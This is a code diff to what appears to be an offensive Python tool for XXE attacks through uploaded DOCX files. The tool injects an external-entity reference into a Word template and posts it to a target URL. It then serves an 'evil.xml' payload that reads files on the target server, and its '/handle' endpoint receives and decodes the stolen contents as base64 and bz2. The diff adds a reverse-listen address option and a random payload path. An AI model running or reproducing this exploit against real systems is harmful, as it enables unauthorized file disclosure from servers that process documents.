@@ -16,8 +16,7 @@ import bz2
 import shlex
 import time
 
-#PPATH = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
-PPATH = "X8SI4JA6XR"
+PPATH = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
 LFI_PATH = ''
 
 class InterceptorHttp(http.server.SimpleHTTPRequestHandler):
@@ -32,39 +31,37 @@ class InterceptorHttp(http.server.SimpleHTTPRequestHandler):
         pass
 
     def do_GET(self):
-        if LFI_PATH is not None and len(LFI_PATH) > 0:
-            cmd = shlex.split(LFI_PATH)
-            EVIL_XML = None
-            if cmd[0] == "cat":
-                EVIL_XML = self.__class__.LS_EVIL_XML.format(cmd[1], self.server.server_address[0], self.server.server_port, PPATH)
-            elif cmd[0] == "http":
-                EVIL_XML = self.__class__.HTTP_EVIL_XML.format(cmd[1], self.server.server_address[0], self.server.server_port, PPATH)
+        if self.path == "/":
+            pass
+        elif self.path == "/{}/evil.xml".format(PPATH):
+            if LFI_PATH is not None and len(LFI_PATH) > 0:
+                cmd = shlex.split(LFI_PATH)
+                EVIL_XML = None
+                if cmd[0] == "cat":
+                    EVIL_XML = self.__class__.LS_EVIL_XML.format(cmd[1], self.server.evil['addr'], self.server.evil['port'], PPATH)
+                elif cmd[0] == "http":
+                    EVIL_XML = self.__class__.HTTP_EVIL_XML.format(cmd[1], self.server.evil['addr'], self.server.evil['port'], PPATH)
 
-            if EVIL_XML == None:
-                print("Unknown command: '{}'".format(cmd[0]))
-                return
+                if EVIL_XML == None:
+                    print("Unknown command: '{}'".format(cmd[0]))
+                    return
 
-            if self.path == "/":
-                pass
-            elif self.path == "/{}/evil.xml".format(PPATH):
-                self.send_response(200)
-                self.send_header('Content-Type', 'text/xml')
-                self.end_headers()
-                self.wfile.write(EVIL_XML.encode())
-            elif self.path.startswith("/{}/handle".format(PPATH)):
-                self.send_response(200)
-                self.end_headers()
-                try:
-                    print(bz2.decompress(base64.b64decode(self.path.split('?')[1])).decode('utf-8'))
-                except:
-                    import traceback
-                    traceback.print_exc()
-                    print(self.path)
-                self.wfile.write("".encode())
-            else:
-                print('Request: "{}" not treated'.format(self.path))
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/xml')
+            self.end_headers()
+            self.wfile.write(EVIL_XML.encode())
+        elif self.path.startswith("/{}/handle".format(PPATH)):
+            self.send_response(200)
+            self.end_headers()
+            try:
+                print(bz2.decompress(base64.b64decode(self.path.split('?')[1])).decode('utf-8'))
+            except:
+                import traceback
+                traceback.print_exc()
+                print(self.path)
+            self.wfile.write("".encode())
         else:
-            print("LFI_PATH not set")
+            print('Request: "{}" not treated'.format(self.path))
     
 def infect_docx(temp_dir, url, template):
     import zipfile
@@ -101,11 +98,15 @@ def post_docx(docx_path, url, data, headers):
     r = requests.post(**kwargs)
 
 
-def run_server(listen, port):
+def run_server(reverse_listen, listen, port):
     print("[+] Listening on: http://{}:{}/".format(listen, port))
-    print("[+] Payload: http://{}:{}/{}/evil.xml".format(listen, port, PPATH))
-    print("[+] Handler: http://{}:{}/{}".format(listen, port, PPATH))
+    print("[+] Payload: http://{}:{}/{}/evil.xml".format(listen if reverse_listen is None else reverse_listen, port, PPATH))
+    print("[+] Handler: http://{}:{}/{}".format(listen if reverse_listen is None else reverse_listen, port, PPATH))
     with http.server.ThreadingHTTPServer((listen, port), InterceptorHttp) as httpd:
+        httpd.evil = {
+            'addr': listen if reverse_listen is None else reverse_listen,
+            'port': port
+        }
         httpd.serve_forever()
 
 def set_next_cmd(paths_file):
@@ -127,6 +128,7 @@ def main(args):
     parser.add_argument('-u', '--url', required=True, type=str, help='URL to post the payload to')
     parser.add_argument('-p', '--port', required=True, type=int, help='Listening port for HTTP server')
     parser.add_argument('-l', '--listen', required=True, type=str, help='Ip for HTTP server listen')
+    parser.add_argument('-rl', '--reverse-listen', required=False, type=str, help='Ip served in XML payload')
     parser.add_argument('-t', '--template', type=str, help='Docx template')
     parser.add_argument('-f', '--file', type=str, help='Docx file')
     parser.add_argument('-X', '--header', nargs='*', required=False)
@@ -136,17 +138,21 @@ def main(args):
 
     args = parser.parse_args(args[1:])
 
-    url = "http://{}:{}".format(args.listen, args.port)
+    url_serve = "http://{}:{}".format(args.listen, args.port)
+    if args.reverse_listen is not None:
+        url = "http://{}:{}".format(args.reverse_listen, args.port)
+    else:
+        url = url_serve
+
     LFI_PATH = args.path
     with tempfile.TemporaryDirectory() as tmpdirname:
-        tmpdirname = "/tmp/tototototot"
         if args.template is not None:
             print("Infecting {}".format(args.template))
             docx_path = infect_docx(tmpdirname, url, pathlib.PurePath(args.template))
         else:
             docx_path = pathlib.PurePath(args.file)
         try:
-            st = Thread(target=run_server, args=[args.listen, args.port])
+            st = Thread(target=run_server, args=[args.reverse_listen, args.listen, args.port])
             st.start()
             pt = None
             if LFI_PATH is not None:
